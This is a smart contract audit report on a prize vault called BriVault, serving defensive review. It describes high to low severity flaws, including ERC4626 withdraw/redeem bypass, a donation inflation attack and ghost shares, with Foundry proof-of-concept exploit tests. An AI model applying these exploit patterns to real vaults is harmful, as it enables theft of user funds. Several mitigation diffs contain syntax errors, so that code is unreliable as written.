# Replay the Missing Findings

- [Replay the Missing Findings](#replay-the-missing-findings)
  - [High](#high)
    - [H-4 Failure to Override ERC4626 Functions Enables Prize Pool Bypass and Unauthorized Withdrawals](#h-4-failure-to-override-erc4626-functions-enables-prize-pool-bypass-and-unauthorized-withdrawals)
    - [\[H-5\] Stale ParticipantShares Snapshot Leads to Unfair Winner Payouts](#h-5-stale-participantshares-snapshot-leads-to-unfair-winner-payouts)
    - [\[H-6\] The Custom `_convertToShares` function Vulnerable to Zero Shares in Inflation Attack](#h-6-the-custom-_converttoshares-function-vulnerable-to-zero-shares-in-inflation-attack)
  - [Medium](#medium)
    - [M-2 Function `cancelParticipation` Leaves Ghost Shares,leads to incorrect Winner Withdrawls](#m-2-function-cancelparticipation-leaves-ghost-sharesleads-to-incorrect-winner-withdrawls)
  - [Low](#low)
    - [\[L-1\] Support for Non-Standard ERC20 Assets (Fee-on-Transfer or Rebasing)](#l-1-support-for-non-standard-erc20-assets-fee-on-transfer-or-rebasing)
    - [\[L-2\] No-Winner Case Causes Withdraw to Divide by Zero, Locking All Vault Funds](#l-2-no-winner-case-causes-withdraw-to-divide-by-zero-locking-all-vault-funds)
    - [\[L-3\] Rounding Dust in Share Calculations Leads to Irrecoverable Vault Asset Loss](#l-3-rounding-dust-in-share-calculations-leads-to-irrecoverable-vault-asset-loss)
    - [\[L-4\] deposit Event Emits Incomplete Parameters, Preventing Accurate Off-Chain Tracking](#l-4-deposit-event-emits-incomplete-parameters-preventing-accurate-off-chain-tracking)


## High

### H-4 Failure to Override ERC4626 Functions Enables Prize Pool Bypass and Unauthorized Withdrawals

**Description:** Since only winners are supposed to withdraw after set winner according to the game logic, this design is intended to lock all funds until the event concludes. However, because the `briVault` contract inherits from `ERC4626` and fails to override the `withdraw` and `redeem` functions from the parent contract, an attacker can directly call ERC4626’s `withdraw` or `redeem` to bypass the vault’s custom logic. This allows participants to exit and withdraw their funds as soon as they realize they are not going to win, breaking the game mechanics and draining the prize pool.


**Impact:** Since the contract code is publicly available on-chain, users can easily inspect it. Once they know they did not win, they can directly call these inherited ERC4626 functions to withdraw their funds. This allows them to bypass the game logic entirely and drain the prize pool.

**Proof of Concept:**
Place the following code in briVault.t.sol.
<details>
<summary>Proof Of Code</summary>

``` solidity
    function testCallErc4626FunctionWithdrawUndRedeem() public {
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 20 ether);
        uint256 sharesUser1=briVault.deposit(10 ether, user1);
        briVault.joinEvent(1);
        vm.stopPrank();

        vm.startPrank(user2);
        mockToken.approve(address(briVault), 20 ether);
        uint256 sharesUser2 = briVault.deposit(10 ether, user2);
        briVault.joinEvent(2);
        vm.stopPrank();

        vm.warp(eventEndDate+ 1 days);

        vm.prank(briVault.owner());
        briVault.setWinner(10);

        vm.prank(user1);
        briVault.withdraw(9.85 ether,user1,user1);

        vm.prank(user2);
        briVault.redeem(sharesUser2 ,user2, user2);

        assertGt(mockToken.balanceOf(user1), 10 ether);
        assertGt(mockToken.balanceOf(user2), 10 ether);
        assertEq(mockToken.balanceOf(address(briVault)),0);


    }
```
</details>


**Recommended Mitigation:** 
Override the `withdraw` and `redeem` functions so that external users cannot bypass the vault logic and withdraw funds from the prize pool.

```diff
-      function withdraw() external winnerSet {
+      function withdrawWinnerSharea external winnerset{
        if (block.timestamp < eventEndDate) {
            revert eventNotEnded();}
            ...
        }

+       function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256){
+           revert;
+       }


+       function redeem(uint256 shares, address receiver, address owner) public override returns (uint256){
+           revert;
+       }
```

### [H-5] Stale ParticipantShares Snapshot Leads to Unfair Winner Payouts

**Description:**  
The `withdraw()` function calculates the payout for winners using the user’s current `balanceOf(msg.sender)` as the numerator, while the denominator `totalWinnerShares` is based on participant shares recorded only at `joinEvent`. Since later deposits are not added to `totalWinnerShare`s, using the current balance rather than the snapshot can result in numerator exceeding denominator.

**Impact:** 
This mismatch can lead to overpayment to withdrawing users or, in extreme cases, vault funds being insufficient, breaking the intended fair distribution of assets. The correct behavior is to use the participant shares snapshot recorded at joinEvent for both numerator and denominator to ensure payouts remain proportional and predictable.  

``` solidity
   function withdraw() external winnerSet {
        ...
@>      uint256 shares = balanceOf(msg.sender);

@>       uint256 vaultAsset = finalizedVaultAsset;
        uint256 assetToWithdraw = Math.mulDiv(shares, vaultAsset, totalWinnerShares);
        
        ....
    }

```

```solidity
   function joinEvent(uint256 countryId) public {
        ...
        
        userToCountry[msg.sender] = teams[countryId];

        
        uint256 participantShares = balanceOf(msg.sender);
@>      userSharesToCountry[msg.sender][countryId] = participantShares;

        usersAddress.push(msg.sender);

        numberOfParticipants++;
@>      totalParticipantShares += participantShares;

        emit joinedEvent(msg.sender, countryId);
    }
```

**Proof of Concept:**

1. User1 deposits 1 ETH and joins the event.
2. User2 deposits 1 ETH and joins the event.
3. User1 deposits an additional 10 ETH.

**Result**:When User1 attempts to withdraw, the transaction reverts because the calculated assetToWithdraw exceeds the actual assets in the vault.User2, however, receives more than they should due to the stale totalWinnerShares value.

Place the following code in briVault.t.sol.
<details>
<summary>Proof Of Code</summary>

``` solidity
    function testTotalWinnerSharesIsOutdated() public {
        // user 1 deposite and join event with 1ETH
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 20 ether);
        briVault.deposit(1 ether, user1);
        briVault.joinEvent(1);
        vm.stopPrank();

        // user 2 deposite and join event with 1ETH
        vm.startPrank(user2);
        mockToken.approve(address(briVault), 20 ether);
        briVault.deposit(1 ether, user2);
        briVault.joinEvent(1);
        vm.stopPrank();

        //user 1 increases deposit significantly
        vm.startPrank(user1);
        briVault.deposit(10 ether, user1);
        vm.stopPrank();

        // set winner and pass the time
        vm.warp(block.timestamp + 40 days);
        vm.prank(briVault.owner());
        briVault.setWinner(1);

        // failed because withdrawu more than the totalAsset
        vm.prank(user1);
        vm.expectRevert();
        briVault.withdraw();
       

        // calculate the asset to withdraw for user 2
        uint256 balanceBeforeWithdrawUser2 = mockToken.balanceOf(user2);
        vm.startPrank(user2);
        briVault.withdraw();
        uint256 balanceAfterWithdrawUser2= mockToken.balanceOf(user2);
        uint256 AssetToWithdrawUser2 = balanceAfterWithdrawUser2 - balanceBeforeWithdrawUser2;

        console2.log("Asset to withdraw for user 2:", AssetToWithdrawUser2);
    }


```

```
Logs:
  Asset to withdraw for user 2: 5910000000000000000
```
</details>

**Recommended Mitigation:** `JoinEvent` should be triggered during deposit to ensure participant shares are updated in real time.


### [H-6] The Custom `_convertToShares` function Vulnerable to Zero Shares in Inflation Attack

**Description:** The custom `_convertToShares` function does not properly handle scenarios where an `inflation attack` (donation) occurs. In this attack, an early user can mint a small number of shares with a minimal deposit, and then an attacker can directly donate a large amount of the underlying asset to the vault. This inflates `balanceOf(address(this))` without minting new shares, leaving `totalSupply` unchanged while `totalAssets` increases significantly. Because the function does not account for rounding up or small deposits relative to the inflated vault balance, subsequent users may receive zero shares or far fewer shares than they should for their deposits, effectively losing their funds and breaking the fair share allocation promised by the ERC4626 standard.

**Impact:**  Due to the inflated share price caused by the attacker’s donation, small user deposits may mint zero shares or far fewer shares than they should because the vault does not implement virtual shares or virtual assets to stabilize the initial exchange rate. The attacker, who holds the only shares in existence, can then redeem those shares at the artificially inflated price, withdrawing not only the assets he donated but also the victims’ deposits. As a result, the attacker effectively steals all assets deposited by later users, while those users receive zero or significantly fewer shares and lose their funds entirely.

**Proof of Concept:**
Place the following code in briVault.t.sol.
<details>
<summary>Proof Of Code</summary>

```solidity
    function testInflationAttack()public {
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 1 ether);
        uint256 sharesUser1=briVault.deposit(0.001 ether, user1);
        mockToken.transfer(address(briVault), 1000 ether);
        vm.stopPrank();

        vm.startPrank(user2);
        mockToken.approve(address(briVault), 1 ether);
        uint256 sharesUser2 = briVault.deposit(0.001 ether, user2);
        vm.stopPrank();

        console2.log("sharesUser1=", sharesUser1);
        console2.log("sharesUser2=", sharesUser2);

        assert(sharesUser1 > sharesUser2);

    }
```

```
  sharesUser1= 985000000000000
  sharesUser2= 970224044
```
</details>

**Recommended Mitigation:** Use OpenZeppelin’s ERC4626 implementation instead of a custom function. 

## Medium

### M-2 Function `cancelParticipation` Leaves Ghost Shares,leads to incorrect Winner Withdrawls

**Description:** 

In the `cancelParticipation` function, the contract fails to properly clean up the `userSharesToCountry` mapping defined in `joinEvent`, which is used to calculate `totalWinnerShares`. As a result, an attacker can repeatedly deposit and then cancel participation, artificially inflating totalWinnerShares. These `ghost shares` dilute the rewards of legitimate winners, causing them to withdraw less than their rightful amounts.

```javascript
    function cancelParticipation () public  {
        if (block.timestamp >= eventStartDate){
           revert eventStarted();
        }

        uint256 refundAmount = stakedAsset[msg.sender];

        stakedAsset[msg.sender] = 0;

        uint256 shares = balanceOf(msg.sender);
        
        _burn(msg.sender, shares);

        IERC20(asset()).safeTransfer(msg.sender, refundAmount);
        // do not clean up the shares from  userSharesToCountry
    }

    function _getWinnerShares () internal returns (uint256) {
        for (uint256 i = 0; i < usersAddress.length; ++i){
@>            address user = usersAddress[i]; 
@>          totalWinnerShares += userSharesToCountry[user][winnerCountryId];
        }
        return totalWinnerShares;
    }
```

**Impact:** 
This causes `usersAddress.length` and `totalWinnerShares` to be calculated incorrectly, which in turn inflates the denominator when calculating `assetsToWithdraw`, resulting in all winners receiving less than their rightful rewards.

**Proof of Concept:**

The victim joins the event, while the attacker joins the event and cancels participation 10 times. As a result, totalWinnerShares becomes larger than the amount deposited by the victim.

<details>
<summary>Proof Of Code</summary>

```javascript
    function testCancelParticipationCauseWrongAssetToWithdraw() public {
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 20 ether);
        briVault.deposit(10 ether, user1);
        briVault.joinEvent(1);
        vm.stopPrank();

        vm.startPrank(attacker);
        mockToken.approve(address(briVault),200 ether);
        
        // for loop deposite join cancel participant 10 times
        for(uint i=0; i<10; i++){
            briVault.deposit(10 ether, attacker);
            briVault.joinEvent(1);
            briVault.cancelParticipation();
        }
        // the totalWinnerShares should be 10 only from the user, but the amount from the attacker will also be calculated
        vm.stopPrank();
        
        vm.warp(block.timestamp + 40 days);
        vm.prank(briVault.owner());
        briVault.setWinner(1);

        assertGt(briVault.totalWinnerShares(), 10 ether);
        
    }

```
</details>

**Recommended Mitigation:**  Remove the user’s address from the `usersAddress` array, reset `userSharesToCountry[user][winnerCountryId]` to 0, and clear all state variables that were set during the joinEvent function for this user.

```diff
 function cancelParticipation () public  {
        if (block.timestamp >= eventStartDate){
           revert eventStarted();
        }

        uint256 refundAmount = stakedAsset[msg.sender];

        stakedAsset[msg.sender] = 0;

        uint256 shares = balanceOf(msg.sender);
        
        _burn(msg.sender, shares);
         
         // check if userToCountry[msg.sender] definiert
+        if(bytes(userToCountry[msg.sender]).length > 0){
+           for(uint256 i;i<teamslength; ++){
+         // check if the string same 
+               if (keccak256(abi.encodepacked(teams[i]))==keccak256(abi.encodepacked(userToCountry[msg.sender]))){
+                   userSharesToCountry[msg.sender][countryId] =0;
+               }
+           }
+       }
+        // delete the mapping
+       delete userToCountry[msg.sender];

+       for(uint256 i;i < usersAddress.length; ++){
+           if (usersAddress[i] ==msg.sender){
+                //overwrite the last element to this position, and delete the last one
+                usersAddress[i] = usersAddress[usersAddress.length -1];
+                usersAddress.pop();
+                break
+
+            }
+        }


        IERC20(asset()).safeTransfer(msg.sender, refundAmount);


    }
```


## Low

### [L-1] Support for Non-Standard ERC20 Assets (Fee-on-Transfer or Rebasing)

**Description:** The issue is that if the asset is fee-on-transfer (e.g., deducts 1% on transfer) or rebasing (e.g., balances auto-adjust for yield), the vault receives less than expected in deposits or sees fluctuating balances, leading to over-minting shares or insufficient assets for withdrawals.

**Impact:** This causes incorrect share allocation, vault insolvency, or unfair dilution, as the contract doesn't account for or reject non-standard tokens.


### [L-2] No-Winner Case Causes Withdraw to Divide by Zero, Locking All Vault Funds

**Description:** The withdraw function calculates winnings by dividing the prize pool by the total shares of all winners. If the contract owner declares a winner that no participant chose, the number of winner shares becomes zero. This causes a division-by-zero error, making the withdraw function fail every time it's called. Because there is no other way to retrieve the funds, this error results in all assets being permanently locked in the vault.



### [L-3] Rounding Dust in Share Calculations Leads to Irrecoverable Vault Asset Loss

**Description:** * The BriVault protocol distributes tournament winnings proportionally based on winner shares. When calculating individual payouts using `Math.mulDiv(shares, vaultAsset, totalWinnerShares)`, integer division creates rounding remainders that are permanently lost. This dust accumulation violates fund conservation principles and results in protocol funds becoming permanently inaccessible.

**Recommended Mitigation:** In the ERC4626 standard, deposit() calculations typically use rounding down when converting assets → shares, while withdraw() operations use rounding up when converting shares → assets.
The remaining dust can be transferred out.


```solidity
    function previewDeposit(uint256 assets) public view virtual returns (uint256) {
        return _convertToShares(assets, Math.Rounding.Floor);
    }

    /// @inheritdoc IERC4626
    function previewMint(uint256 shares) public view virtual returns (uint256) {
        return _convertToAssets(shares, Math.Rounding.Ceil);
    }
```


### [L-4] deposit Event Emits Incomplete Parameters, Preventing Accurate Off-Chain Tracking

**Description:** The `deposit() `function in BriVault always emits the `deposited` event. However, the event currently only includes the receiver address and asset amount, omitting the actual caller (msg.sender) who initiated the deposit.When the `depositor` and the share `receiver` are different addresses, off-chain monitoring systems, analytics tools, or automated scripts cannot determine who actually deposited the assets. This can lead to incorrect user activity tracking, inaccurate accounting, and potential auditing discrepancies.

The recommended approach is to follow the ERC4626 standard by including both the `sender` and `receiver` in the event, ensuring that deposits are properly traceable regardless of whether the depositor and receiver are the same.

